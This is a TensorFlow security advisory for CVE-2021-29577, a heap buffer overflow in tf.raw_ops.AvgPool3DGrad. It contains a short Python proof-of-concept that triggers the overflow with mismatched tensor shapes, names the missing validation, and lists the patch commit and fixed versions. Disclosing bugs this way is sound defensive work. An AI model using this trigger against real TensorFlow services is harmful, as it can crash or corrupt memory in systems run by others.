## TFSA-2021-065: Heap buffer overflow in `AvgPool3DGrad`

### CVE Number
CVE-2021-29577

### Impact
The implementation of `tf.raw_ops.AvgPool3DGrad` is vulnerable to a heap buffer
overflow:

```python
import tensorflow as tf

orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.AvgPool3DGrad(
  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,
  padding=padding)
```

The
[implementation](https://github.com/tensorflow/tensorflow/blob/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b/tensorflow/core/kernels/pooling_ops_3d.cc#L376-L450)
assumes that the `orig_input_shape` and `grad` tensors have similar first and
last dimensions but does not check that this assumption is validated.

### Patches
We have patched the issue in GitHub commit
[6fc9141f42f6a72180ecd24021c3e6b36165fe0d](https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
